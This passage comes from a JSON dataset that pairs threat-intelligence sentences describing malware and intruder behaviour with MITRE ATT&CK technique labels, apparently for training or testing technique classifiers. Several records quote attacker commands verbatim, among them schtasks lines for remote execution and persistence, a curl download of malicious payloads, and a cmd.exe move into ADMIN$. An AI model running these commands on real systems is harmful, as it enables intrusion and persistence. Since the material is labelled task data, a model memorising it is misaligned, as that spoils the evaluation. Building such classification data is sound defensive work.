    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used the `CreateProcessA` and `ShellExecute` API functions to launch commands after being injected into a selected process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Clicking on the LNK file executes the batch file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "will delete its dropped files after bypassing UAC.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "HTTP traffic to C2",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used publicly available tools to dump password hashes including ProcDump and WCE.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "was abused by the attacker to steal client data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download and execute a file on the victims machine.(Citation: TrendMicro MacOS April 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has searched the Program Files directories for specific folders and has searched for strings related to its mutexes.(Citation: Medium Metamorfo Apr 2020)(Citation: Fortinet Metamorfo Feb 2020) ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Some  variants use HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These were either dropped directly via the webshell or downloaded from a remote server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to upload to its C2 server information about files on the victim mobile device including SD card size installed app list SMS content contacts and calling history.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "collects the network adapter information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.(Citation: ESET Lazarus Jun 2020)(Citation: Qualys LolZarus)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed creating remote services",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use scheduled tasks for execution.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Task manager was then use to reveal the service running on PID 3488,",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used batch scripts and the command-line interface for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Modifies the Windows registry",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "collects and sends system information to its C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "will check if the process avp.exe exists.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "the orchestrator injects the network component into memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by adding Registry Run keys.(Citation: ClearSky Wilted Tulip July 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This utility is able to execute complicated WQL queries and WMI methods",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "to download the second stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "installer can attempt to achieve persistence by creating a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through users being lured into opening malicious e-mail attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "is installed via execution of rundll32 with an export named init or InitW.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "adversary using Windows Batch files",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "gathers basic system information,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has a number of modules that use WMI to execute tasks.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": ", the GetSubDirectoryFileListRecursive function",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "to download and execute an intermediate script which then downloaded and executed the Standard IcedID Loader using a non-standard export “init”.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry subkey that registers a new service.  also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\\Environment\\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can send data to C2 with HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTPS for communication with C2.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used Wrapper/Gholee custom-developed malware which downloaded additional malware to the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "added Registry Run keys to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has been observed adding the downloaded payload to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to maintain persistence.(Citation: Symantec Emotet Jul 2018)(Citation: US-CERT Emotet Jul 2018)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "actors leverage legitimate credentials to log into external remote services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can perform DLL loading.(Citation: TrendMicro Taidoor)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can collect IP information from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "using the WinExec API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to identify the drive type on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Recent versions of  delete files and registry keys created by the malware.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect the IP address of the victims and other computers on the network using the commands: ipconfig -all nbtstat -n and nbtstat -s.(Citation: ESET Carbon Mar 2017)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "invoked the wave 2 ransomware immediately from the command line",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can achieve persistence through the Registry Run key.(Citation: ESET EvilNum July 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has commands to list drives on the victim machine and to list file information for a given directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Sets Run Key with “work/online”",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Download a file from the C2 server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can modify the registry run keys HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "copies itself to the Startup folder to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Executable that accepts an executable as an argument and executes it with hidden console",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "had commands to enumerate files and directories.(Citation: FireEye SUNBURST Backdoor December 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can search a compromised host for specific files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32.exe to load.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can enable Windows CLI access and execute files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can identify users registered to a targeted machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "These words are used to build the registry value names.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has deleted tmp and prefetch files during post compromise cleanup activities.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download a file from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "is capable of performing process listings.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to execute DLLs.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Once the command line arguments are generated",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "collected hostname OS version and device uptime.(Citation: FireEye SUNBURST Backdoor December 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "CreateProcessAsUser or CreateProcess is executed,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used the command cmd /c tasklist to get a snapshot of the current processes on the target machine.(Citation: Medium KONNI Jan 2020)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has deleted dropper files on an infected system using command scripts.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "performs process discovery using tasklist commands.(Citation: Mandiant Operation Ke3chang November 2014)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list running processes on the infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "“wmic os get LocalDateTime /value”.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "surveys a system upon check-in to discover network configuration details using the arp -a nbtstat -n net config ipconfig /all and route commands as well as .(Citation: Kaspersky Turla)(Citation: Symantec Waterbug Jun 2019)(Citation: ESET ComRAT May 2020)  RPC backdoors have also retrieved registered RPC interface information from process memory.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS for C2 communications.(Citation: Kaspersky Turla)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect network information including the host IP address DNS and proxy information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to log into remote machines for propagation.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can use Windows API including `WinExec` for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The common processes observed were two injected processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can securely delete files by first writing random data to the file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Windows net commands were run,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "malware has deleted files in various ways including suicide scripts to delete malware binaries from the victim.  also uses secure file deletion to delete files from the victim.(Citation: Novetta Blockbuster)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "and again on a server with Administrator privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate all files and directories on an infected system.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use DriveList to retrieve drive information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "sending an HTTP POST request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used native APIs including GetModuleFileName lstrcat CreateFile and ReadFile.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can delete files from the system.(Citation: FireEye APT41 Aug 2019) ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to receive and execute a self-delete command.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has sent spearphishing attachments attempting to get a user to open them.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has created new services and modified existing services for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "used Rundll32 to execute payloads. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The SCOUT variant of  achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "When running the file from the command line,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used a script to detect which Linux distribution and version is currently installed on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used stolen domain admin accounts to compromise additional hosts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has relied on a user to execute a malicious attachment delivered via spearphishing.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "created their own directories to drop files into.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can use `uname` to identify the operating system name version and processor type.(Citation: Objective See Green Lambert for OSX Oct 2021) ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Get the user name of the compromised host",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "uses PsExec to modify the system registry parameter MaxMpxCt",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "HTTP communication between the Beacon and the Cobalt Strike server",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to complicate forensic analysis by deleting all the files contained in %APPDATA%\\..\\Local\\Temporary Internet Files\\Content.Word and %APPDATA%\\..\\Local Settings\\Temporary Internet Files\\Content.Word\\.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "is capable of writing a file to the compromised system from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "checked if the compromised system is configured to use proxies.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can delete files on the victims machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has created Registry keys for persistence in [HKLM|HKCU]\\\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can detect the computer name operating system and drive information including drive type total number of bytes on disk total number of free bytes on disk and name of a specified volume.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate Registry keys including KEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir to search for a bitcoin wallet.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "DLL gets injected",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "communicates over HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "using a domain administrator’s account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "cmd.exe session",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a base directory that contains the files and folders that are collected.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "retrieved a list of the system's network interface after execution.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the service account logged into one of the Domain Controllers from the beachhead.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence via a Registry Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "uploads files from a specified directory to the C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "adversary executes Cobalt Strike’s built-in Mimikatz to dump its password hashes.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can find information about processes running on local and remote systems.(Citation: Github PowerShell Empire)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used  and a custom tool SecHack to harvest credentials. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "write the batch file on the remote system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files to a targeted system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has achieved persistence via scheduled tasks. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use GetProcAddress to help delete malicious strings from memory.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: `SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.`",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Get list of drives",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used WizTree to obtain network files and directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can get user agent strings for the default browser from HKCU\\Software\\Classes\\http\\shell\\open\\command.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "A  variant has used HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has gathered information about running processes.(Citation: TrendMicro Ursnif Mar 2015)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has executed a PowerShell command to download a file to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download and upload files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to remotely execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks called `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` and `MicrosoftEdgeCrashRepoeterTaskMachineUA` which were configured to execute `CrashReporter.exe` during user logon.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can upload files from victims' machines.(Citation: Bitdefender FunnyDream Campaign November 2020)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "all running processes are enumerated and logged via EnumProcesses (32-bit processes).",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "uses commands such as netsh interface show to discover network interface settings.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to act as a second-stage dropper used to infect the system with additional malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The  Directory Lister module can list information about files and directories including creation time last write time name and size.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has relied on victims opening a malicious Excel file for execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file – Picture2.exe",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "schtasks /create /F /tn “\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager” /tr “C:\\Windows\\SoftwareDistribution\\EventCacheManager.exe” /sc ONSTART /ru system /",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\_1636727589.6007507 2>&1` to deploy on an infected system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "may collect information about the system by running hostname and systeminfo on a victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "installs a service pointing to a malicious DLL dropped to disk.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "retrieves the same files from the C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can delete old binaries on a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has modified Registry settings for security tools.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has sent malicious files requiring direct victim interaction to execute.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Avira Mustang Panda January 2020)(Citation: Recorded Future REDDELTA July 2020)(Citation: Google TAG Ukraine Threat Landscape March 2022)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTPS for C2.(Citation: TrendMicro Ursnif Mar 2015)(Citation: FireEye Ursnif Nov 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use process hollowing for execution.(Citation: Cobalt Strike TTPs Dec 2017)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has convinced victims to open malicious attachments to execute malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "deletes data in a way that makes it unrecoverable.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used file deletion to remove some modules and configurations from an infected host after use.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP to download shellcode from compromised websites.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can store captured system information locally prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Potential Process Hollowing",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has connected to C2 servers via HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows API calls ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "installs a registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has remotely copied tools and malware onto targeted systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used code to obtain the external public-facing IPv4 address of the compromised host. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can download payloads and extract bytes from files.  uses the curl -fsL $url >$tmp_path command to download malicious payloads into a temporary directory.(Citation: Carbon Black Shlayer Feb 2019)(Citation: sentinelone shlayer to zshlayer)(Citation: 20 macOS Common Tools and Techniques)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "code modules use various API functions to load and inject code.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has performed local network configuration discovery using ipconfig.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC Group APT15 Alive and Strong)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to edit the Registry.(Citation: DigiTrust NanoCore Jan 2017)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP HTTPS and WebDav in network communications.(Citation: Kaspersky Cloud Atlas December 2014)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": " can use `cmd.exe` to execute a created batch file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use known credentials to run commands and spawn processes as a local user account.(Citation: cobaltstrike manual)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "“The banking trojan targets the victim’s sensitive information",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute commands for discovery.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It still downloads a PowerShell code",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GetProcessByDescription",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "One persistence mechanism used by  is to register itself as a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "uses the ipconfig command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "uses the SetSecurityDescriptorDacl API to reduce object integrity levels.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can exfiltrate files from local file systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP to communicate with C2.",
    "command": "",
